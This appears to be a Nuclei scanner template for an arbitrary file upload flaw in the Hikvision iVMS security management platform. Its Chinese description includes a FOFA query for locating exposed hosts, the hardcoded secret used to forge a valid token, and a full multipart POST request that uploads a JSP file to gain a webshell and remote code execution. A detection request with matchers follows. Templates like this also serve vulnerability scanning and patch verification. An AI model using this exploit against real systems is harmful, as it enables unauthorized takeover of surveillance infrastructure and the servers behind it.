id: hikvision-file-upload

info:
  name: "海康威视iVMS综合安防管理平台upload接口任意文件上传漏洞"
  author: 0dayPoc
  severity: high
  description: |-
    fofa: web.body="/views/home/file/installPackage.rar"
          海康威视iVMS系统存在未公开的漏洞，攻击者可通过获取系统密钥生成有效token，向/resourceOperations/upload接口发起请求实现任意文件上传，从而获取服务器webshell权限并执行远程代码。
          进一步验证请求示例：
      POST /eps/api/resourceOperations/upload?token=构造的token值 HTTP/1.1
      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
      Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
      Connection: close
      Cookie: ISMS_8700_Sessionname=A29E70BEA1FDA82E2CF0805C3A389988
      Content-Type: multipart/form-data;boundary=----WebKitFormBoundaryGEJwiloiPo
      Upgrade-Insecure-Requests: 1
       
      ------WebKitFormBoundaryGEJwiloiPo
      Content-Disposition: form-data; name="fileUploader";filename="NTest.jsp"
      Content-Type: image/jpeg
       
      NdayPoc
      ------WebKitFormBoundaryGEJwiloiPo
      
      token值需进行MD5(http://ip:port/eps/api/resourceOperations/uploadsecretKeyIbuilding)的值（32位大写）
      上传成功后返回resourceUuid值
      验证路径：http://ip:port/eps/upload/resourceUuid的值.jsp
  tags: HiKVISION

http:
- raw:
  - |
    POST /eps/api/resourceOperations/upload HTTP/1.1
    Host: {{Hostname}}
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Connection: close
    Cookie: ISMS_8700_Sessionname=7634604FBE659A8532E666FE4AA41BE9
    Upgrade-Insecure-Requests: 1

    service=http%3A%2F%2Fip:port%3Ax%2Fhome%2Findex.action
  matchers-condition: and
  matchers:
  - type: status
    status: [200]
  - type: word
    part: body
    words:
    - 'token'
  - type: word
    part: body
    words:
    - 'empty'
